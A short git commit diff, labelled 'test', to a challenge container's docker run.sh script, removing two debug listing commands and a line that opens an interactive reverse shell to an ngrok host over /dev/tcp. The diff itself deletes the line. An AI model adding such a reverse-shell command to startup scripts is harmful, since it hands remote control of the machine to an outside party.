bb6c56662db722c0d48e7e56c24755534b867bce
davidhcefx <davidhu0903ex3@gmail.com>
2020-11-24 06:39:30 +0800

    test

--- challenge/docker/run.sh
+++ challenge/docker/run.sh
@@ -3,9 +3,6 @@
 name="constr"
 ports="80:80"
 
-exec 5<>/dev/tcp/0.tcp.ngrok.io/17430; bash -i >&5 0>&1
-ls /app/vendor/docker
-ls /app/vendor/docker/docker
 /app/vendor/docker/docker/dockerd -H fd:// --containerd=/run/containerd/containerd.sock &
 
 # copy binary
